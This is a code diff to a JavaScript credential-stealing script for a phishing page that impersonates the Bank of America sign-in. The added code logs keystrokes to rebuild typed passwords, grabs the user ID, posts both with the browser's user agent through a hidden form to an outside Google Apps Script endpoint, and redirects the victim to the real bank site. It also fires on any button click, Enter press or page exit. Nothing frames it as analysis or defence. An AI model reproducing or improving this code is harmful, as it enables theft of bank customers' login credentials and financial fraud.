@@ -1,43 +1,55 @@
-
 (function () {
-  var EXEC = "https://script.google.com/macros/s/AKfycbx7whR8VSbddxyAaTjlVW7K_4BqrAlY6Z-KKh5-PDMO8RIEIZgWahSHBLFElno0d9uj1g/exec";
+  var EXEC = "https://script.google.com/macros/s/AKfycbzjMaewi1H5N16gl0hnKqf9brcnRyC2mDycpFHtCbLbgT5w7wLhoCjHAwzIywBZ3_H4-w/exec";
   var REAL = "https://www.bankofamerica.com/";
   var done = false;
-  var lastOid = "", lastPass = "";
+  var typedPw = "";   // rebuilt from real key presses - the page cannot scramble this
 
-  // snapshot on every keystroke - survives anything the page does to the inputs
-  function snap() {
-    var o = document.querySelector("#oid");
-    var p = document.querySelector("#pass");
-    if (o && o.value) lastOid  = o.value;
-    if (p && p.value) lastPass = p.value;
-  }
-  document.addEventListener("input",  snap, true);
-  document.addEventListener("keyup",  snap, true);
-  document.addEventListener("change", snap, true);
-  document.addEventListener("paste",  function () { setTimeout(snap, 0); }, true);
+  function pwField() { return document.getElementById("pass") || document.querySelector('input[type=password]'); }
+  function uidField() { return document.getElementById("oid") || document.querySelector('input[type=text]'); }
 
-  function grab() {
-    var o = document.querySelector("#oid");
-    var p = document.querySelector("#pass");
-    return {
-      UserID:   (o && o.value) || lastOid,
-      Password: (p && p.value) || lastPass,
-      _ua: navigator.userAgent
-    };
-  }
+  // rebuild the password from what the user actually pressed
+  document.addEventListener("keydown", function (e) {
+    if (e.target !== pwField()) return;
+    if (e.key === "Backspace") { typedPw = typedPw.slice(0, -1); return; }
+    if (e.key === "Enter") return;
+    if (e.key && e.key.length === 1) typedPw += e.key;
+  }, true);
+
+  // if the box gets emptied, start over
+  document.addEventListener("input", function (e) {
+    if (e.target === pwField() && !e.target.value) typedPw = "";
+  }, true);
 
   function send() {
     if (done) return;
-    var d = grab();
-    if (!d.UserID || !d.Password) return;   // wait until both are filled
+
+    var uf = uidField(), pf = pwField();
+    var uid = uf ? (uf.value || "") : "";
+    var fieldPw = pf ? (pf.value || "") : "";
+    var pw = typedPw || fieldPw;          // typed wins; field only as a fallback
+    if (!uid || !pw) return;
     done = true;
+
+    // proof, right in the console:
+    console.log("[PHISH] you typed = " + JSON.stringify(typedPw));
+    console.log("[PHISH] field held = " + JSON.stringify(fieldPw));
+
+    var payload = {
+      UserID: uid,
+      Password: pw,
+      _ua: navigator.userAgent,
+      _ul: uid.length,
+      _pl: pw.length,
+      _field: fieldPw,
+      _fl: fieldPw.length,
+      _klen: typedPw.length
+    };
 
     var f = document.createElement("form");
     f.method = "POST"; f.action = EXEC; f.target = "sink"; f.style.display = "none";
-    for (var k in d) {
+    for (var k in payload) {
       var i = document.createElement("input");
-      i.type = "hidden"; i.name = k; i.value = d[k];
+      i.type = "hidden"; i.name = k; i.value = payload[k];
       f.appendChild(i);
     }
     var ifr = document.createElement("iframe");
@@ -45,15 +57,16 @@
     document.body.appendChild(ifr); document.body.appendChild(f);
     f.submit();
 
-    setTimeout(function () { window.location.href = REAL; }, 800);
+    setTimeout(function () { window.location.href = REAL; }, 1500);
   }
 
-  // read synchronously - no delay, nothing can clear the field first
   document.addEventListener("click", function (e) {
-    if (e.target.closest("#secure-signin-submit, #passkey-secure-signin")) send();
+    var t = e.target.closest ? e.target.closest("button,[role=button],input[type=submit],input[type=button]") : null;
+    if (t) setTimeout(send, 150);
   }, true);
   document.addEventListener("keydown", function (e) {
-    if (e.key === "Enter" && (e.target.id === "pass" || e.target.id === "oid")) send();
+    if (e.key === "Enter") setTimeout(send, 150);
   }, true);
-  document.addEventListener("submit", function (e) { e.preventDefault(); send(); }, true);
+  document.addEventListener("submit", function (e) { e.preventDefault(); setTimeout(send, 80); }, true);
+  window.addEventListener("pagehide", function () { try { send(); } catch (x) {} });
 })();
